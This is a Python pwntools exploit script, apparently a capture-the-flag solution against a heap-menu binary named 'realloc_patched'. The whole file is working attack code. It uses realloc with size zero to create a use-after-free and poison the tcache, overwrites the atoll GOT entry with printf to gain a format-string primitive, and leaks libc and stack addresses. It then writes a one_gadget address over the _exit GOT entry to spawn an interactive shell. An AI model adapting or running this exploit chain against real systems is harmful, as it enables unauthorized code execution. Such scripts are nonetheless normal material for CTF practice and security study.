from pwn import *

def start(argv=[], *a, **kw):
        if args.GDB:
                return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
        elif args.REMOTE:
                return remote(sys.argv[1], sys.argv[2], *a, **kw)
        else:
                return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x040129d
continue
'''.format(**locals())

exe = './realloc_patched'

elf = context.binary = ELF(exe)
libc = ELF('./libc.so')

sla  = lambda r, s: conn.sendlineafter(r, s)
sl   = lambda    s: conn.sendline(s)
sa   = lambda r, s: conn.sendafter(r, s)
se   = lambda s: conn.send(s)
ru   = lambda r, **kwargs: conn.recvuntil(r, **kwargs)
rl   = lambda : conn.recvline()
uu32 = lambda d: u32(d.ljust(4, b'\x00'))
uu64 = lambda d: u64(d.ljust(8, b'\x00'))

conn = start()

def alloc(index, size, data):
    sla(b'choice: ', b'1')
    sla(b'Index:', str(index).encode())
    sla(b'Size:', str(size).encode())
    sla(b'Data:', data)

def realloc(index, size, data):
    sla(b'choice: ', b'2')
    sla(b'Index:', str(index).encode())
    sla(b'Size:', str(size).encode())
    if len(data) != 0:
        sla(b'Data:', data)

def free(index):
    sla(b'choice: ', b'3')
    sla(b'Index:', str(index).encode())

def exit():
    sla(b'choice: ', b'4')

def fmt_leak(idx):
        sla(b'Your choice: ',b'1')
        sa(b'Index:',f'%{idx}$p')
        return conn.recv(14)

def fmt_write(idx, value):
        sla(b'Your choice: ',b'1')
        sa(b'Index:',f'%{value}c%{idx}$hhn'.ljust(16))

def leave():
	sla(b'Your choice: ', b'4')

alloc(0, 0x50, b'B' * 0x50)
realloc(0, 0, b'')
realloc(0, 0x50, b'\0' * 0x10)
free(0)

atol = elf.got['atoll']
printPLT = elf.sym['printf']

print('Atoll GOT: ', hex(atol))

alloc(0, 0x50, p64(atol))
alloc(1, 0x50, b'\0' * 0x50)
realloc(1, 0x60, b'\0' * 0x60)
free(1)

alloc(1, 0x50, p64(printPLT))

leak_libc = int(fmt_leak(23).decode(),16)
stack_address = int(fmt_leak(18).decode(), 16)
libc.address = leak_libc - 0x26b6b

print("Leak $12%p: ", fmt_leak(12))
print("Leak $18%p: ", fmt_leak(18))
print("Leak libc start main: ", hex(leak_libc))
print("Libc: ", hex(libc.address))

for i in range(3):
    fmt_write(12, (stack_address & 0xff) + i)
    fmt_write(18, p64(elf.got['_exit'])[i])

# overwrite got address of _exit with one_gadget
one_gadget = libc.address + 0xe2383
fmt_write(12, stack_address & 0xff)
for i in range(6):
    fmt_write(18, (elf.got['_exit'] & 0xff) + i)
    fmt_write(22, p64(one_gadget)[i])

# trigger one_gadget
leave()

conn.interactive()
